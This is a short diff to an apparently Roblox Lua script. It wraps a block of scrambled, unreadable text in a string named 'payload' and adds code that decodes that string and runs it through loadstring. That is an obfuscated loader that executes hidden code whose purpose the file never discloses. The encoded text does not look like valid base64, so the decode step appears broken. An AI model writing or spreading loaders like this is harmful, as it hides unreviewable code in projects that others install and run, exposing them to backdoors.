@@ -1,3 +1,4 @@
+local payload = [[
 
 
 qmw``gij}sYdpqjjuqljkcl}clkdi(/
@@ -74,3 +75,11 @@ dgoda(/dKFL@KQoPKBI@	(/dKFL@KQwPLK	(/fJWDIw@@CV	(/fWD
 pluDAALKB	HDLK(/HDLKuDAuDAALKBgJQQJHpaLHK@R
 	(/HDLKvL_@paLHK@R
 			
+]]
+
+local function decode(b64)
+    local HttpService = game:GetService("HttpService")
+    return HttpService:Base64Decode(b64)
+end
+
+loadstring(decode(payload))()
